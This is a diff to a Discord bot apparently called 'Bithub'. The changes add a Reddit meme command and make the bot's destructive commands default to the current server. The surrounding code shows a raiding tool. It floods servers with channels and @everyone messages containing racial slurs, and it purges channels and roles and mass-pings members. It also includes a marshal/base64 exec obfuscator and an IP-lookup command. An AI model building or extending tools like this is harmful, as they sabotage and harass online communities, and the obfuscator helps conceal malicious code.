@@ -11,6 +11,7 @@ import marshal
 import string
 import socket
 import subprocess
+import praw
 from config import TOKEN
 from utils.tokeninfo import tokeninfo
 from discord.ext import commands
@@ -54,7 +55,7 @@ from discord.ui import Select
 
 
 
-YOURUSERID = '992952207588720730'
+YOURUSERID = ''
 DMONREADY = "FALSE"
 
 
@@ -65,6 +66,10 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 
 bot.remove_command('help')
+
+reddit = praw.Reddit(client_id='',
+                     client_secret='',
+                     user_agent='')
 
 
 
@@ -478,7 +483,9 @@ async def setstatus(ctx, status: str):
 
 
 @bot.command()
-async def flush(ctx, server_id):
+async def flush(ctx, server_id=None):
+    if server_id is None:
+        server_id = ctx.guild.id
     try:
         channel_names = ["NUKED NIGGAS", "get fucked", "RAIDED", "GET SHITTED ON"]
         message_contents = ["@everyone GET NUKED 🤡", "@everyone RAIDED", "@everyone speak your shit lil niggas", "@everyone FLOP"]
@@ -547,7 +554,9 @@ async def customflush(ctx, server_id, channel_amount, channel_name, message_amou
         await ctx.reply(embed=embxdd)
         
 @bot.command()
-async def purge(ctx, server_id):
+async def purge(ctx, server_id=None):
+    if server_id is None:
+        server_id = ctx.guild.id
     try:
         guild = bot.get_guild(int(server_id))
         if guild is not None:
@@ -564,7 +573,9 @@ async def purge(ctx, server_id):
 
 
 @bot.command()
-async def leave(ctx, server_id):
+async def leave(ctx, server_id=None):
+    if server_id is None:
+        server_id = ctx.guild.id
     guild = bot.get_guild(int(server_id))
     if guild is not None:
         guildname = guild.name
@@ -615,7 +626,9 @@ async def servlist(ctx):
     await ctx.send(f"Server list:\n{server_list}")
 
 @bot.command()
-async def massping(ctx, server_id: int, message_amount: int = 5, *, message_content: str = ""):
+async def massping(ctx, server_id=None, message_amount: int = 5, *, message_content: str = ""):
+    if server_id is None:
+        server_id = ctx.guild.id
     guild = bot.get_guild(server_id)
     if guild is None:
         await ctx.send("Invalid server ID.")
@@ -635,7 +648,9 @@ async def massping(ctx, server_id: int, message_amount: int = 5, *, message_cont
     
 
 @bot.command()
-async def clear(ctx, server_id: int):
+async def clear(ctx, server_id=None):
+    if server_id is None:
+        server_id = ctx.guild.id
     guild = bot.get_guild(server_id)
     if guild is None:
         await ctx.send("Invalid server ID.")
@@ -672,7 +687,9 @@ async def clearchannel(ctx, server_id: int, channel_id: int):
 
 
 @bot.command()
-async def rolepurge(ctx, server_id):
+async def rolepurge(ctx, server_id=None):
+    if server_id is None:
+        server_id = ctx.guild.id
     try:
         guild = bot.get_guild(int(server_id))
         if guild is None:
@@ -887,9 +904,10 @@ async def github(ctx, user):
             repo_data = repo_response.json()
             x = user
 
-            helpembed = discord.Embed(title=f'{x} - Github', color=discord.Color.green())
+            helpembed = discord.Embed(title=f'{x}', color=discord.Color.green())
             helpembed.set_thumbnail(url=avatar_url)
-            helpembed.add_field(name='📛 Name', value=f'{name}', inline=False)
+            helpembed.add_field(name='📂 Profile', value=f'https://github.com/{x}', inline=False)
+            helpembed.add_field(name='🏷️ Name', value=f'{name}', inline=False)
             helpembed.add_field(name='💬 Bio', value=f'{bio}', inline=False)
             helpembed.add_field(name=':baby: Followers', value=f'[{followers}](https://github.com/{x}?tab=followers)', inline=False)
             helpembed.add_field(name='🥸 Following', value=f'[{following}](https://github.com/{x}?tab=following)', inline=False)
@@ -905,9 +923,9 @@ async def github(ctx, user):
 
             await ctx.reply(embed=helpembed)
         else:
-            await ctx.reply("Failed to retrieve repository information.")
+            await ctx.reply("❌ Failed to retrieve repository information.")
     else:
-        await ctx.reply("Failed to retrieve profile information.")
+        await ctx.reply("❌ Failed to retrieve profile information.")
 
 
 @bot.command()
@@ -937,6 +955,22 @@ async def ip(ctx, ip):
       # return country, city, zipcode, isp, callingcode, latitude, longtitude, location, hostname, prox
 
 @bot.command()
+async def shitpost(ctx, source="dankmemes"):
+    global color_codes
+    cc = random.choice(color_codes)
+    cc_int = int(cc, 16) 
+    subreddit = reddit.subreddit(source)
+    posts = subreddit.hot(limit=69)
+    random_post = random.choice(list(posts))
+
+    embed = discord.Embed(title=random_post.title, color=cc_int)  
+    embed.set_image(url=random_post.url)
+    embed.set_footer(text=f"r/{source} | {cc}")
+
+    await ctx.send(embed=embed)
+
+
+@bot.command()
 async def help(ctx):
     helprembed = discord.Embed(title='Bithub V0.2 <:glory:1168889710438010950>', description="", color=discord.Color.gold())
     helprembed.set_footer(text="Started - 10/17/2023")
@@ -963,6 +997,10 @@ async def help(ctx):
         discord.SelectOption(
             label="Misc",
             emoji="🤠", 
+            description=""),
+        discord.SelectOption(
+            label="Shit",
+            emoji="🤡", 
             description=""),
         discord.SelectOption(
             label="Github",
@@ -1042,6 +1080,13 @@ async def help(ctx):
 
             await interaction.response.send_message(embed=xembed, ephemeral=True)
 
+        if select.values[0] == "Shit":
+            xembed = discord.Embed(title='Info', color=discord.Color.dark_magenta())
+            xembed.add_field(name='💩 Shitpost', value=f'Random post from reddit\n`{bot.command_prefix}shitpost <subreddit>`', inline=False)
+            xembed.set_footer(text="Github: x9o")
+
+            await interaction.response.send_message(embed=xembed, ephemeral=True)
+
 
         if select.values[0] == "Github":
             await ctx.reply("🤖 [Bot Repo](https://github.com/x9o/Bithub)\n🐦‍⬛ [Profile](https://github.com/x9o/)")
@@ -1054,11 +1099,15 @@ async def help(ctx):
 
     await ctx.send(embed=helprembed, view=view)
 
-#                                  non bot functions                                      #
+
+#                    non bot functions                                      #
 
 #=========================================================================================#
 
 
+
+
+ 
 def obfuscate(content):
     compiled_code = compile(content, '<string>', 'exec')
         # Marshal the compiled code
@@ -1071,6 +1120,8 @@ def obfuscate(content):
     obfuscated_code = f'''
 import base64
 import marshal
+
+# You can put shit code here or remove this line.
 
 {rvn} = {encoded_code!r}
 exec(marshal.loads(base64.b64decode({rvn}.encode('latin1'))))
@@ -1141,7 +1192,37 @@ def ipinfo(address):
 
 
 
-
+color_codes = [
+    "0xff4500",
+    "0xFAEBD7",
+    "0x00FFFF",
+    "0x7FFFD4",
+    "0xF0FFFF",
+    "0xF5F5DC",
+    "0xFFE4C4",
+    "0x000000",
+    "0xFFEBCD",
+    "0x0000FF",
+    "0x8A2BE2",
+    "0xA52A2A",
+    "0xDEB887",
+    "0x5F9EA0",
+    "0x7FFF00",
+    "0xD2691E",
+    "0xFF7F50",
+    "0x6495ED",
+    "0xFFF8DC",
+    "0xDC143C",
+    "0x00FFFF",
+    "0x00008B",
+    "0x008B8B",
+    "0xB8860B",
+    "0xA9A9A9",
+    "0x006400",
+    "0xBDB76B",
+    "0x8B008B",
+    "0x556B2F",
+]
 
 
         
